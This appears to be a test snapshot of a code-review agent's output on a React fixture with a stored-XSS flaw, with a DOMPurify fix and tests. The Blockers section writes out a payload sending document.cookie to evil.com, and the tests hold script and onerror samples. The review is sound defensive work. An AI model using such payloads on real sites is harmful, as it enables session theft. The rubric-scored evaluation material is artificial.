# Snapshot: react-xss-risk
# Agent: react-ts-review
# Fixture: fixtures/react/xss_risk.tsx
# Date: 2026-02-22
# Rubric score: 8/8 ✅

## Summary
- `dangerouslySetInnerHTML` renders user-supplied `comment.body` directly as HTML
- No sanitization anywhere in the component
- Risk: stored XSS — attacker stores `<script>` or event handler payload in a comment, executes in every viewer's browser

## Blockers

1. **XSS via `dangerouslySetInnerHTML` with unsanitized user input**
   - `comment.body` is user-supplied (from API) and rendered as raw HTML without any sanitization
   - Payload: `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">` stored as a comment body → exfiltrates session cookie from every user who views it
   - Fix: sanitize with `DOMPurify.sanitize()` before rendering, or avoid `dangerouslySetInnerHTML` entirely and render as plain text

## Minor issues

2. **`key={i}` — index key on a list**
   - Minor given this fixture's primary issue, but index keys will cause reconciliation bugs if comments are reordered or filtered

## Suggested patch

```tsx
import DOMPurify from 'dompurify'

export function CommentList({ comments }: { comments: Comment[] }) {
  return (
    <ul>
      {comments.map((comment) => (
        <li key={comment.id}>  {/* use stable ID, not index */}
          <strong>{comment.author}</strong>
          <div dangerouslySetInnerHTML={{
            __html: DOMPurify.sanitize(comment.body)
          }} />
        </li>
      ))}
    </ul>
  )
}
```

> If rich HTML is not needed, prefer: `<p>{comment.body}</p>` — React escapes text content automatically.

## Tests

```tsx
test('sanitizes script tags from comment body', () => {
  const comments = [{ id: 1, author: 'Alice', body: '<script>alert(1)</script>Hello' }]
  render(<CommentList comments={comments} />)
  expect(document.querySelector('script')).toBeNull()
  expect(screen.getByText(/Hello/)).toBeInTheDocument()
})

test('sanitizes event handler payloads', () => {
  const comments = [{ id: 1, author: 'Bob', body: '<img src=x onerror="alert(1)">' }]
  render(<CommentList comments={comments} />)
  const img = document.querySelector('img')
  expect(img?.getAttribute('onerror')).toBeNull()
})
```

